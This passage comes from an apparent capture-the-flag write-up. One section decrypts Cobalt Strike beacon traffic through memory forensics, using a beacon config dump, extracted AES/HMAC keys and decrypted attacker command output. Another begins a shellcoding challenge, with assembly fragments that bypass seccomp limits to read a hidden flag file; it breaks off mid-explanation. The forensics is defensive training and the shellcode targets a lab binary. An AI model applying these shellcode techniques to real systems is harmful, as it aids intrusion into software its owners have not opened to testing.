such:</p><ul><li><strong>Infection</strong>: The client is infected with either a staged, or a stageless payload. For a stageless payload, it will decode itself, and then load itself into memory. The configuration for the beacon is XOR encrypted but by default, use a <strong>static XOR key</strong> for each respective beacon version (3 or 4).</li><li><strong>Heartbeat</strong>: The infected host sends a heartbeat to the Cobalt Strike C2 server with basic metadata and queues up any commands (read Tasks) that were added.</li><li><strong>Tasks</strong>: Cobalt Strike uses AES-256 in CBC mode with HMAC-SHA-256 to encrypt task commands (i.e. commands sent remotely by the attacker). The AES key can be found in the encrypted metadata that is sent during a heartbeat, but it also <em>lives shortly in <strong>memory</strong></em> of the infected process.</li><li><strong>Callbacks</strong>: After a task is executed, the host calls back to the C2 server with a encrypted payload containing the results of the task.</li></ul><p>A more detailed explanation can be found on page 10 and 11 in the paper by Nick Navis.</p><img src=/images/posts/cobalt_strike_c2_communication_flow.png alt="A diagram of the Cobalt Strike C2 communication flow"><p><em>A diagram of the Cobalt Strike C2 communication flow</em>. Source: <a href=https://blog.nviso.eu/2021/10/27/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-2/>NVISO Labs</a></p><h4 id=beacon-configuration>Beacon Configuration<a hidden class=anchor aria-hidden=true href=#beacon-configuration>#</a></h4><p><a href=https://didierstevens.com/>Didier Stevens</a> has made a tool, <a href=https://blog.didierstevens.com/2020/11/07/1768-k/>1768 K</a>, which decodes and dumps the configuration of Cobalt Strike beacons. He later <a href=https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/>updated</a> this tool (3 weeks ago at the time of writing this) with newer statistics.</p><h4 id=decrypting-cobalt-strike-traffic>Decrypting Cobalt Strike Traffic<a hidden class=anchor aria-hidden=true href=#decrypting-cobalt-strike-traffic>#</a></h4><p>Didier Stevens made yet another blog post, <a href=https://blog.didierstevens.com/2021/04/26/quickpost-decrypting-cobalt-strike-traffic/>&ldquo;Quickpost: Decrypting Cobalt Strike Traffic&rdquo;</a>. He made a tool (<a href=https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py>cs-extract-key.py</a>) that looks in the dumped process memory for the unencrypted metadata that the beacon sends to the C2. Furthermore, he also made a tool (<a href=https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py>cs-parse-http-traffic.py</a>) that can use the extracted keys to decrypt and parse the encrypted HTTP C2 communication in a PCAP file.</p><h3 id=solution>Solution<a hidden class=anchor aria-hidden=true href=#solution>#</a></h3><p>Our goal is &ldquo;simple&rdquo;, we need to decrypt the traffic between the infected host and the C2 server. From our research above we know that we have to:</p><ol><li>Extract and decrypt the Cobalt Strike Beacon configuration</li><li>Dump the memory of the process that was infected with the payload</li><li>Extract the AES and HMAC keys from the process memory</li><li>Use these keys to decrypt the C2 (HTTP) communication</li></ol><h4 id=extracting-and-decoding-beacon-configuration>Extracting And Decoding Beacon Configuration<a hidden class=anchor aria-hidden=true href=#extracting-and-decoding-beacon-configuration>#</a></h4><p>Opening the PCAP in Wireshark, we can easily filter on <code>http</code> and find the Cobalt Strike stager shellcode request and thus the beacon in <code>tcp.stream eq 9</code>. We export this payload to a file (<code>ept_beacon</code>).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> /stE1 <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>User-Agent<span style=color:#f92672>:</span> <span style=color:#ae81ff>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; LBBROWSER)</span>
</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>172.16.32.2</span>
</span></span><span style=display:flex><span>Connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>Keep-Alive</span>
</span></span><span style=display:flex><span>Cache-Control<span style=color:#f92672>:</span> <span style=color:#ae81ff>no-cache</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HTTP/1.1 200 OK
</span></span><span style=display:flex><span>Date: Mon, 25 Oct 2021 07:12:52 GMT
</span></span><span style=display:flex><span>Content-Type: application/octet-stream
</span></span><span style=display:flex><span>Content-Length: 261191
</span></span><span style=display:flex><span>--- snip ---
</span></span></code></pre></div><p>We use the updated <a href=https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/>1768</a> tool to extract the configuration for the C2 beacon, note the process injection configuration.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python 1768.py -r ept_beacon
</span></span><span style=display:flex><span>File: ept_beacon
</span></span><span style=display:flex><span>xorkey<span style=color:#f92672>(</span>chain<span style=color:#f92672>)</span>: 0xa6b02dff
</span></span><span style=display:flex><span>length: 0x03fc0089
</span></span><span style=display:flex><span>Config found: xorkey b<span style=color:#e6db74>&#39;.&#39;</span> 0x00000000 0x000057cf
</span></span><span style=display:flex><span>0x0001 payload type                     0x0001 0x0002 <span style=color:#ae81ff>0</span> windows-beacon_http-reverse_http
</span></span><span style=display:flex><span>0x0002 port                             0x0001 0x0002 <span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>0x0003 sleeptime                        0x0002 0x0004 <span style=color:#ae81ff>60000</span>
</span></span><span style=display:flex><span>0x0004 maxgetsize                       0x0002 0x0004 <span style=color:#ae81ff>1048576</span>
</span></span><span style=display:flex><span>0x0005 jitter                           0x0001 0x0002 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x0006 maxdns                           0x0001 0x0002 <span style=color:#ae81ff>255</span>
</span></span><span style=display:flex><span>0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100baaa6b1100ef88c737a50e0f9f86279487a3a838e7e1da5fb1fb1fbcc8b2361207756fa5cfd1fd2c86dc86e32ac73055e7c6da46d13beaa3bc171892fb62e4c90206aaa9c28cb4f9aefc752c9fbc3ae723ed070b0f1dd516b9f75cd4d58a6e61784040d4147ba9fe2c84b9df49e67311dc7999c83772fccab8b7eb78af293135020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
</span></span><span style=display:flex><span>0x0008 server,get-uri                   0x0003 0x0100 <span style=color:#e6db74>&#39;172.16.32.2,/load&#39;</span>
</span></span><span style=display:flex><span>0x0009 useragent                        0x0003 0x0080 <span style=color:#e6db74>&#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)&#39;</span>
</span></span><span style=display:flex><span>0x000a post-uri                         0x0003 0x0040 <span style=color:#e6db74>&#39;/submit.php&#39;</span>
</span></span><span style=display:flex><span>0x000b Malleable_C2_Instructions        0x0003 0x0100 <span style=color:#e6db74>&#39;\x00\x00\x00\x04&#39;</span>
</span></span><span style=display:flex><span>0x000c http_get_header                  0x0003 0x0100
</span></span><span style=display:flex><span>  Cookie
</span></span><span style=display:flex><span>0x000d http_post_header                 0x0003 0x0100
</span></span><span style=display:flex><span>  &amp;Content-Type: application/octet-stream
</span></span><span style=display:flex><span>  id
</span></span><span style=display:flex><span>0x000e SpawnTo                          0x0003 0x0010 <span style=color:#e6db74>&#39;\x92~\x14√≤¬ªD\x08\x89e\x89\x92\x1f`√¥&amp;n&#39;</span>
</span></span><span style=display:flex><span>0x001d spawnto_x86                      0x0003 0x0040 <span style=color:#e6db74>&#39;%windir%\\syswow64\\rundll32.exe&#39;</span>
</span></span><span style=display:flex><span>0x001e spawnto_x64                      0x0003 0x0040 <span style=color:#e6db74>&#39;%windir%\\sysnative\\rundll32.exe&#39;</span>
</span></span><span style=display:flex><span>0x000f pipename                         0x0003 0x0080 <span style=color:#f92672>(</span>NULL ...<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>0x001f CryptoScheme                     0x0001 0x0002 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x0013 DNS_Idle                         0x0002 0x0004 <span style=color:#ae81ff>0</span> 0.0.0.0
</span></span><span style=display:flex><span>0x0014 DNS_Sleep                        0x0002 0x0004 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x001a get-verb                         0x0003 0x0010 <span style=color:#e6db74>&#39;GET&#39;</span>
</span></span><span style=display:flex><span>0x001b post-verb                        0x0003 0x0010 <span style=color:#e6db74>&#39;POST&#39;</span>
</span></span><span style=display:flex><span>0x001c HttpPostChunk                    0x0002 0x0004 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x0025 license-id                       0x0002 0x0004 <span style=color:#ae81ff>885300606</span>
</span></span><span style=display:flex><span>0x0026 bStageCleanup                    0x0001 0x0002 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x0027 bCFGCaution                      0x0001 0x0002 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x0036 HostHeader                       0x0003 0x0080 <span style=color:#f92672>(</span>NULL ...<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>0x0032 UsesCookies                      0x0001 0x0002 <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>0x0023 proxy_type                       0x0001 0x0002 <span style=color:#ae81ff>2</span> IE settings
</span></span><span style=display:flex><span>0x003a                                  0x0003 0x0080 <span style=color:#e6db74>&#39;\x00\x04&#39;</span>
</span></span><span style=display:flex><span>0x0039                                  0x0003 0x0080 <span style=color:#e6db74>&#39;\x00\x04&#39;</span>
</span></span><span style=display:flex><span>0x0037                                  0x0001 0x0002 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x0028 killdate                         0x0002 0x0004 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x0029 textSectionEnd                   0x0002 0x0004 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x002b process-inject-start-rwx         0x0001 0x0002 <span style=color:#ae81ff>64</span> PAGE_EXECUTE_READWRITE
</span></span><span style=display:flex><span>0x002c process-inject-use-rwx           0x0001 0x0002 <span style=color:#ae81ff>64</span> PAGE_EXECUTE_READWRITE
</span></span><span style=display:flex><span>0x002d process-inject-min_alloc         0x0002 0x0004 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x002e process-inject-transform-x86     0x0003 0x0100 <span style=color:#f92672>(</span>NULL ...<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>0x002f process-inject-transform-x64     0x0003 0x0100 <span style=color:#f92672>(</span>NULL ...<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>0x0035 process-inject-stub              0x0003 0x0010 <span style=color:#e6db74>&#39;√íS√ìn\x83w1\x98√ºEh√Æ\x90I?,&#39;</span>
</span></span><span style=display:flex><span>0x0033 process-inject-execute           0x0003 0x0080 <span style=color:#e6db74>&#39;\x01\x02\x03\x04&#39;</span>
</span></span><span style=display:flex><span>0x0034 process-inject-allocation-method 0x0001 0x0002 <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>0x0000
</span></span><span style=display:flex><span>Guessing Cobalt Strike version: 4.2 <span style=color:#f92672>(</span>max 0x003a<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>With this we also find 3 HTTP requests that were during the communication (TCP stream <code>117</code>, <code>121</code>, and <code>131</code>).</p><p>Wireshark filter: <code>ip.addr == 172.16.32.2 and http.request.uri matches "/submit.php*"</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&amp; ls ./streams
</span></span><span style=display:flex><span>117.hex  121.hex  131.hex
</span></span><span style=display:flex><span>$ cat 117.hex
</span></span><span style=display:flex><span>000000403c328a67f95f9f2f4d2ed72853369bc476eff4234d932a569a3d22d852dc453e7c22d12f6bc461f2adca8c448a85c5b26204522c2fe327af7d608acc27e4333f
</span></span></code></pre></div><p>We also find the encrypted metadata blob in a cookie sent in a <code>/load</code> request:</p><pre tabindex=0><code>Cookie: dhJBx9uy37Z1YC4YF/ePAKIiFj9mkS7hsd0hwK3DO0vPAkwB/cziZXYPaVJiPFuJlzpLZZKM0Dbi9XwF3bHR76vyPhVKBaRN975ISSNxIjLGNvl6598X2Nop/noEA2ZIo+KWqXC6uRwIPh4EWdI4wlitNy63ye8clGZwbAZAhMY=
</code></pre><h4 id=dump-memory-of-the-infected-process>Dump Memory Of The Infected Process<a hidden class=anchor aria-hidden=true href=#dump-memory-of-the-infected-process>#</a></h4><p>We need to find the process where the beacon was injected, we know that it uses <code>rundll32.exe</code> to inject into a process (<code>spawnto</code> from the beacon configuration), we also note the process injection flag (<code>PAGE_EXECUTE_READWRITE</code>) .</p><p>To analyze the memory dump, we use the <a href=https://www.volatilityfoundation.org/>Volatility memory forensics framework</a>. We also know from the challenge description that the provided memory dump was taken from a machine running <code>Windows 10 x64 Build 19043.1237</code>, the closest matching profile for this in Volatility is <code>Win10x64_19041</code>.</p><p>Looking at <a href=https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal>Volatility&rsquo;s Command Reference for Malware</a> we find the <code>malfind</code> command, which helps find hidden or injected code/DLLs in user mode memory, based on characteristics such as VAD tag and page permissions.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 malfind
</span></span></code></pre></div><p>We find 2 interesting processes: <code>smartscreen.ex Pid: 5576</code> and <code>svchost.exe Pid: 3452</code>.</p><pre tabindex=0><code>Process: svchost.exe Pid: 3452 Address: 0x720000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: PrivateMemory: 1, Protection: 6

0x0000000000720000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x0000000000720010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x0000000000720020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x0000000000720030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................

0x0000000000720000 0000             ADD [EAX], AL
0x0000000000720002 0000             ADD [EAX], AL
0x0000000000720004 0000             ADD [EAX], AL
0x0000000000720006 0000             ADD [EAX], AL
0x0000000000720008 0000             ADD [EAX], AL
0x000000000072000a 0000             ADD [EAX], AL
0x000000000072000c 0000             ADD [EAX], AL
0x000000000072000e 0000             ADD [EAX], AL
0x0000000000720010 0000             ADD [EAX], AL
0x0000000000720012 0000             ADD [EAX], AL
0x0000000000720014 0000             ADD [EAX], AL
0x0000000000720016 0000             ADD [EAX], AL
0x0000000000720018 0000             ADD [EAX], AL
0x000000000072001a 0000             ADD [EAX], AL
0x000000000072001c 0000             ADD [EAX], AL
0x000000000072001e 0000             ADD [EAX], AL
0x0000000000720020 0000             ADD [EAX], AL
0x0000000000720022 0000             ADD [EAX], AL
0x0000000000720024 0000             ADD [EAX], AL
0x0000000000720026 0000             ADD [EAX], AL
0x0000000000720028 0000             ADD [EAX], AL
0x000000000072002a 0000             ADD [EAX], AL
0x000000000072002c 0000             ADD [EAX], AL
0x000000000072002e 0000             ADD [EAX], AL
0x0000000000720030 0000             ADD [EAX], AL
0x0000000000720032 0000             ADD [EAX], AL
0x0000000000720034 0000             ADD [EAX], AL
0x0000000000720036 0000             ADD [EAX], AL
0x0000000000720038 0000             ADD [EAX], AL
0x000000000072003a 0000             ADD [EAX], ALZ
0x000000000072003e 0000             ADD [EAX], AL
</code></pre><pre tabindex=0><code>Process: smartscreen.ex Pid: 5576 Address: 0x2491b920000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: PrivateMemory: 1, Protection: 6

0x000002491b920000  48 89 54 24 10 48 89 4c 24 08 4c 89 44 24 18 4c   H.T$.H.L$.L.D$.L
0x000002491b920010  89 4c 24 20 48 8b 41 28 48 8b 48 08 48 8b 51 50   .L$.H.A(H.H.H.QP
0x000002491b920020  48 83 e2 f8 48 8b ca 48 b8 60 00 92 1b 49 02 00   H...H..H.`...I..
0x000002491b920030  00 48 2b c8 48 81 f9 70 0f 00 00 76 09 48 c7 c1   .H+.H..p...v.H..
--- snip ---
</code></pre><p>We note that both of them have the <code>PAGE_EXECUTE_READWRITE</code> set, which is what we saw in the beacon configuration, so we quickly dump the memory of these processes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 memdump -D ./memdumps -p <span style=color:#ae81ff>3452</span>
</span></span><span style=display:flex><span>$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 memdump -D ./memdumps -p <span style=color:#ae81ff>5576</span>
</span></span><span style=display:flex><span>$ ls ./memdumps
</span></span><span style=display:flex><span>3452.dmp  5576.dmp
</span></span></code></pre></div><h4 id=extract-keys>Extract Keys<a hidden class=anchor aria-hidden=true href=#extract-keys>#</a></h4><p>By using <a href=https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py>cs-extract-key.py</a> we can easily parse these memory dumps and extract the AES keys within them (if they exist).</p><p>The script will not be able to find any keys if you run it as-is, Didier notes this in his post:</p><blockquote><p>This method does not always work: the metadata is overwritten after some time, so the process dump needs to be taken quickly after the beacon is started. And there are also cases were this metadata can not be found (I suspect this is version bound).</p></blockquote><p>The tools includes an options to perform a dictionary attack if you provide it a callback payload. The tool then extracts all possible AES and HMAC keys from the process dump and tries to authenticate and decrypt the callback. The callback payload can be found in TCP stream <code>117</code> from the PCAP.</p><p>I somehow messed up this step, but my teammate, <a href=https://twitter.com/Unblvr1>@UnblvR</a>, managed to extract the key successfully from the <code>svchost.exe</code> process and decrypt the traffic:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python cs-extract-key.py -c 000000403c328a67f95f9f2f4d2ed72853369bc476eff4234d932a569a3d22d852dc453e7c22d12f6bc461f2adca8c448a85c5b26204522c2fe327af7d608acc27e4333f ./memdumps/3452.dmp
</span></span><span style=display:flex><span>File: ./memdumps/3452.dmp
</span></span><span style=display:flex><span>AES key position: 0x0002a440
</span></span><span style=display:flex><span>AES Key:  f55fdb402eb483720fe7ca64f1a8a4cf
</span></span><span style=display:flex><span>HMAC key position: 0x0002a450
</span></span><span style=display:flex><span>HMAC Key: ad5584fe824cad1d6b839860c88df785
</span></span></code></pre></div><p><em>Side note:</em> My attempts resulted in an empty output, most likely due to the callback being messed up.</p><h4 id=decrypt-c2-communication>Decrypt C2 Communication<a hidden class=anchor aria-hidden=true href=#decrypt-c2-communication>#</a></h4><p>The final step is to use these extracted keys to decrypt the C2 communication. This is easily done by using the tool (<a href=https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py>cs-parse-http-traffic.py</a>) we found earlier. With the Wireshark filter we created earlier we can be sure to only attempt to decrypt the encrypted payloads. After letting the script run for a bit, we finally see the flag in the last decrypted payload (<code>Packet number: 156656</code>).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python cs-parse-http-traffic.py -k ad5584fe824cad1d6b839860c88df785:f55fdb402eb483720fe7ca64f1a8a4cf -Y <span style=color:#e6db74>&#39;ip.addr == 172.16.32.2 and http.request.uri matches &#34;/submit.php*&#34;&#39;</span> LA-FLAMA-BLANCA-20211025-071559.pcap
</span></span><span style=display:flex><span>Packet number: <span style=color:#ae81ff>143669</span>
</span></span><span style=display:flex><span>HTTP request
</span></span><span style=display:flex><span>http://172.16.32.2/submit.php?id<span style=color:#f92672>=</span><span style=color:#ae81ff>1011624348</span>
</span></span><span style=display:flex><span>Counter: <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Callback: <span style=color:#ae81ff>30</span> UNKNOWN
</span></span><span style=display:flex><span>la-flama-blanca<span style=color:#ae81ff>\k</span>ennyp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Extra packet data: b<span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Packet number: <span style=color:#ae81ff>156050</span>
</span></span><span style=display:flex><span>HTTP request
</span></span><span style=display:flex><span>http://172.16.32.2/submit.php?id<span style=color:#f92672>=</span><span style=color:#ae81ff>1011624348</span>
</span></span><span style=display:flex><span>Counter: <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>Callback: <span style=color:#ae81ff>30</span> UNKNOWN
</span></span><span style=display:flex><span>User name                    KennyP
</span></span><span style=display:flex><span>Full Name
</span></span><span style=display:flex><span>Comment
</span></span><span style=display:flex><span>User<span style=color:#e6db74>&#39;s comment
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Country/region code          000 (System Default)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Account active               Yes
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Account expires              Never
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Password last set            9/29/2021 2:15:34 AM
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Password expires             Never
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Password changeable          9/29/2021 2:15:34 AM
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Password required            No
</span></span></span><span style=display:flex><span><span style=color:#e6db74>User may change password     Yes
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Workstations allowed         All
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Logon script
</span></span></span><span style=display:flex><span><span style=color:#e6db74>User profile
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Home directory
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Last logon                   10/25/2021 12:12:52 AM
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Logon hours allowed          All
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Local Group Memberships      *Administrators       *Users
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Global Group memberships     *None
</span></span></span><span style=display:flex><span><span style=color:#e6db74>The command completed successfully.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Extra packet data: b&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Packet number: 156656
</span></span></span><span style=display:flex><span><span style=color:#e6db74>HTTP request
</span></span></span><span style=display:flex><span><span style=color:#e6db74>http://172.16.32.2/submit.php?id=1011624348
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Counter: 4
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Callback: 0 UNKNOWN
</span></span></span><span style=display:flex><span><span style=color:#e6db74>----------------------------------------------------------------------------------------------------
</span></span></span><span style=display:flex><span><span style=color:#e6db74>flag                     EPT{d3crypt1ng_c0b4lt_str1k3_tnx_2_d1d13r}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Modern\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SystemShared\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>TIP\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>----------------------------------------------------------------------------------------------------
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Extra packet data: b&#39;</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span></code></pre></div><p>Flag: <code>EPT{d3crypt1ng_c0b4lt_str1k3_tnx_2_d1d13r}</code></p><h1 id=shellcoding>Shellcoding<a hidden class=anchor aria-hidden=true href=#shellcoding>#</a></h1><h2 id=-shellcoding-0x05->üî• Shellcoding 0x05 üî•<a hidden class=anchor aria-hidden=true href=#-shellcoding-0x05->#</a></h2><pre tabindex=0><code>This one is a bit different from the others. The flag is in one of 200 files that are randomly created in /opt/flag/. You need to find and print the flag. The files are recreated every minute using the script generateFiles.py which is attached.

I&#39;ve also disabled execv and fork syscalls using seccomp. GL HF! :)
</code></pre><p>As the description says, in this challenge the flag is hidden inside 1 out of 200 randomly named files. Moreover, the shellcode is limited to <strong>70 bytes</strong>, and the entire directory of random files is regenerated every minute. Syscalls are also severely restricted, to not let us do anything fancy like 2-stage payloads or creating more space.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>disableSyscalls</span>() {
</span></span><span style=display:flex><span>    scmp_filter_ctx ctx;
</span></span><span style=display:flex><span>    ctx <span style=color:#f92672>=</span> seccomp_init(SCMP_ACT_ALLOW);
</span></span><span style=display:flex><span>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(fork), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(vfork), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mprotect), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mmap), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(brk), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(munmap), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mremap), <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    seccomp_load(ctx);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The file randomization is done through a Python script, which is using the insecure <code>random</code> module to figure out the names. Exploiting this is a harder problem than just solving the challenge, as we need the outputs in order to predict outputs, so this makes no sense to attack.</p><p>Our general plan is to do something like</p><pre tabindex=0><code>open(&#34;/opt/flag&#34;)
lseek(fd) to skip &#34;.&#34; and &#34;..&#34;&#34;
getdents(fd)
open(file)
sendfile(fd)
</code></pre><p>The string <code>/opt/flag</code> already exists inside the binary through the string <code>"The flag somewhere in /opt/flag"</code>, so that is easy enough.</p><pre tabindex=0><code class=language-assembly data-lang=assembly>/* open(&#34;/opt/flag&#34;) */
pop rdi
add di, 2779
mov al, 2
syscall
</code></pre><p><code>seekdir()</code> just calls <code>lseek()</code> anyways, so let&rsquo;s just go straight to the source and skip a certain number of entries. We dynamically change this OFFSET to a number (explained later), to skip past the uninteresting directory entries in the start. Note that since <code>stdin</code> is closed, the <code>open()</code> syscall is given <code>fd=0</code>.</p><pre tabindex=0><code class=language-assembly data-lang=assembly>/* lseek(0, OFFSET, 0) */
xor eax, eax
mov al, 8
xor edi, edi
xor esi, esi
mov esi, OFFSET
xor edx, edx
syscall
</code></pre><p>Next up is <code>getdents()</code> to fetch the directory entry from <code>OFFSET</code> into <code>$RSP</code> (valid pointer to the stack), pretending we have 100 bytes to write there.</p><pre tabindex=0><code class=language-assembly data-lang=assembly>/* getdents(0, rsp, 100) */
xor eax, eax
mov al, 78
xor edi, edi
mov rsi, rsp
xor edx, edx
mov dl, 100
syscall
</code></pre><p>Now we need to extract the file contents. The structure we just wrote into <code>$RSP</code> looks like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> linux_dirent {
</span></span><span style=display:flex><span>   <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>  d_ino;     <span style=color:#75715e>/* Inode number */</span>
</span></span><span style=display:flex><span>   <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>  d_off;     <span style=color:#75715e>/* Offset to next linux_dirent */</span>
</span></span><span style=display:flex><span>   <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>short</span> d_reclen;  <span style=color:#75715e>/* Length of this linux_dirent */</span>
</span></span><span style=display:flex><span>   <span style=color:#66d9ef>char</span>           d_name[];  <span style=color:#75715e>/* Filename (null-terminated) */</span>
</span></span><span style=display:flex><span>                     <span style=color:#75715e>/* length is actually (d_reclen - 2 -
</span></span></span><span style=display:flex><span><span style=color:#75715e>                        offsetof(struct linux_dirent, d_name)) */</span>
</span></span><span style=display:flex><span>   <span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>   char           pad;       // Zero padding byte
</span></span></span><span style=display:flex><span><span style=color:#75715e>   char           d_type;    // File type (only since Linux
